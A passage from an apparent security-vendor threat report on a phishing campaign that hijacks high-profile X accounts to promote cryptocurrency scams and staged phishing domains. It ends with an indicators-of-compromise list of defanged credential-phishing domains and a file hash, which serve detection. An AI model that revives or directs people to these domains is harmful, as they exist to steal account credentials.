<figure id="attachment_113626" aria-describedby="caption-attachment-113626" style="width: 1522px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="wp-image-113626 size-full" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg" alt="" width="1522" height="762" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice.jpg 1522w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-300x150.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-1024x513.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/tor-project-account-comp-notice-768x385.jpg 768w" sizes="auto, (max-width: 1522px) 100vw, 1522px" /><figcaption id="caption-attachment-113626" class="wp-caption-text">Tor Project account compromise notice</figcaption></figure>
<p>The Decentralized Autonomous Wireless Network (DAWN) was another victim of this type of attack. The threat actor <a href="https://coinpedia.org/news/dawn-internets-x-account-hacked-phishing-scams-target-users-via-telegram/" target="_blank" rel="noopener noreferrer">leveraged</a> the compromised DAWN-related social media accounts to lure victims into entering credentials into phishing pages targeting X and Telegram credentials.</p>
<figure id="attachment_113625" aria-describedby="caption-attachment-113625" style="width: 1354px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113625" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg" alt="" width="1354" height="1358" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post.jpg 1354w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-300x300.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-1021x1024.jpg 1021w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-150x150.jpg 150w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-768x770.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-50x50.jpg 50w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-x-post-24x24.jpg 24w" sizes="auto, (max-width: 1354px) 100vw, 1354px" /><figcaption id="caption-attachment-113625" class="wp-caption-text">DAWN X Posts</figcaption></figure>
<p>The compromise of DAWN’s X accounts goes back to mid-January 2025.</p>
<figure id="attachment_113624" aria-describedby="caption-attachment-113624" style="width: 960px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113624" src="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg" alt="" width="960" height="1106" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post.jpg 960w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-260x300.jpg 260w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-889x1024.jpg 889w, https://www.sentinelone.com/wp-content/uploads/2025/01/DAWN-rewards-comp-post-768x885.jpg 768w" sizes="auto, (max-width: 960px) 100vw, 960px" /><figcaption id="caption-attachment-113624" class="wp-caption-text">January 14, 2025 &#8211; DAWN rewards compromise post</figcaption></figure>
<h3>Crypto-Themed Project Placeholders</h3>
<p>In some cases, we’ve observed cryptocurrency themed projects seemingly acting as placeholders for future use, or direct pump-and-dump schemes. In one example, <code>buy-tanai[.]com</code> was <a href="https://pump.fun/coin/G8pMUeoRVVDQu2hJSzxNPBGWtgtt5BjQ9nCT2BmVpump" target="_blank" rel="noopener noreferrer">pitched</a> as such: “<i>$TANA AI. Dawn&#8217;s AI project, Tana is the first AI-powered LP and trading agent, now live on the Solana blockchain.”</i></p>
<figure id="attachment_113623" aria-describedby="caption-attachment-113623" style="width: 1516px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113623" src="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg" alt="" width="1516" height="338" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun.jpg 1516w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-300x67.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-1024x228.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/tana-ai-pump-fun-768x171.jpg 768w" sizes="auto, (max-width: 1516px) 100vw, 1516px" /><figcaption id="caption-attachment-113623" class="wp-caption-text">Tana AI (TANA) on Pump[.]fun</figcaption></figure>
<p>The domain<code>buy-tanai[.]com</code> currently displays default FASTPANEL landing pages, suggesting it — along with other similar domains — is being staged for future attacks. Since FASTPANEL-managed sites can be rapidly updated, these domains serve as adaptable templates for phishing campaigns.</p>
<p>Notably, TANA AI (TANA) was launched by Dawn in mid-January to promote AI-driven trading and liquidity provision in the cryptocurrency market. Despite losing most of its initial value within days, the currency remains actively traded across multiple decentralized exchanges.</p>
<p>Given the crypto-related nature of these domains, it is likely that threat actors are using them as flexible phishing infrastructure. By keeping them as blank templates, they can quickly modify hosted content to align with ongoing campaigns as needed.</p>
<h3>Crimeware Relations</h3>
<p>Several other domains share overlaps in both use and unique infrastructure details, yet they represent a fork from the previously described high-profile social media profile attacks, including:</p>
<ul>
<li aria-level="1">dataoptimix[.]com</li>
<li aria-level="1">gamecodestudios[.]com</li>
<li aria-level="1">shortwayscooter[.]com</li>
</ul>
<p>The domain <code>shortwayscooter[.]com</code> <a href="https://x.com/JAMESWT_MHT/status/1883780543797723223" target="_blank" rel="noopener noreferrer">hosts</a> fake captchas that deliver the DanaBot banking trojan. DataOptimix is branded as a generative AI solution, though there are few details about what the service does.</p>
<figure id="attachment_113622" aria-describedby="caption-attachment-113622" style="width: 1474px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113622" src="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg" alt="" width="1474" height="1236" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix.jpg 1474w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-300x252.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-1024x859.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/01/dataoptimix-768x644.jpg 768w" sizes="auto, (max-width: 1474px) 100vw, 1474px" /><figcaption id="caption-attachment-113622" class="wp-caption-text">DataOptimix</figcaption></figure>
<h3>Historical Connections</h3>
<p>In mid-2024, a campaign used related infrastructure in similar phishing messages, including those which <a href="https://www.sportskeeda.com/us/streamers/news-linus-sebastian-responds-linus-tech-tips-official-x-account-got-hacked" target="_blank" rel="noopener noreferrer">compromised the Linus Tech Tips</a> Twitter account along with several other high profile users. At the time, @LinusTech had roughly 1.8million followers, which may represent the highest profile account successfully hijacked and linked to this actor.</p>
<figure id="attachment_113621" aria-describedby="caption-attachment-113621" style="width: 852px" class="wp-caption alignnone"><img loading="lazy" decoding="async" class="size-full wp-image-113621" src="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg" alt="" width="852" height="1556" srcset="https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise.jpg 852w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-164x300.jpg 164w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-561x1024.jpg 561w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-768x1403.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/01/linus-tech-tips-compromise-841x1536.jpg 841w" sizes="auto, (max-width: 852px) 100vw, 852px" /><figcaption id="caption-attachment-113621" class="wp-caption-text">Linus Tech Tips Twitter compromise</figcaption></figure>
<h2>Conclusion</h2>
<p>The cryptocurrency landscape offers financially-motivated threat actors multiple opportunities for profit and fraud. While marketing for coins and tokens has long been irreverent and meme-driven, recent developments have further blurred the line between legitimate projects and scams. </p>
<p>A striking example occurred in January 2025, when the X account of the late crypto-enthusiast and antivirus founder John McAfee was reactivated to promote a new coin, <a href="https://cryptoslate.com/john-mcafee-reborn-as-ai-memecoin-and-chatbot-with-27-million-market-cap/" target="_blank" rel="noopener noreferrer">$AIntivirus</a>. The marketing style and brand voice of this purportedly legitimate token closely resemble tactics used in known scam campaigns, highlighting how easily crypto enthusiasts can be misled in an already murky ecosystem.</p>
<p>To safeguard your X account, we strongly recommend using a unique password, enabling two-factor authentication (2FA), and avoiding credential sharing with third-party services. Be especially cautious of messages containing links to account alerts or security notices. Always verify URLs before clicking, and if a password reset is needed, initiate it directly through the official website or app rather than relying on unsolicited links.</p>
<p>If you’ve encountered similar suspicious activity, we’d love to hear from you. Contact SentinelLABS at <a href="mailto:ThreatTips@sentinelone.com" target="_blank" rel="noopener noreferrer">ThreatTips@sentinelone.com</a>.</p>
<h2>Indicators of Compromise</h2>
<p><b>Domains</b><br />
buy-tanai[.]com<br />
dataoptimix[.]com<br />
gamecodestudios[.]com<br />
infringe-x[.]com<br />
protection-x[.]com<br />
rewards-dawn[.]com<br />
securelogins-x[.]xyz<br />
shortwayscooter[.]com<br />
violationappeal-x[.]com<br />
violationcenter-x[.]com<br />
x-accountcenter[.]com<br />
x-changealerts[.]com<br />
x-logincheck[.]com<br />
x-loginhelp[.]com<br />
x-passwordrecovery[.]com<br />
x-recoveraccount[.]com<br />
x-suspiciouslogin[.]com</p>
<p><b>SHA-1</b><br />
e2221e5c58a1a976e59fe1062c6db36d4951b81e &#8211; PHP file containing URL associated with X credential phishing activity</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/01/Phishing-on-X-High-Profile-Account-Targeting-Campaign-Returns-Promoting-Cryptocurrency-Scams-2.jpg" length="95469" type="image/jpeg" />	</item>
	</channel>
</rss>
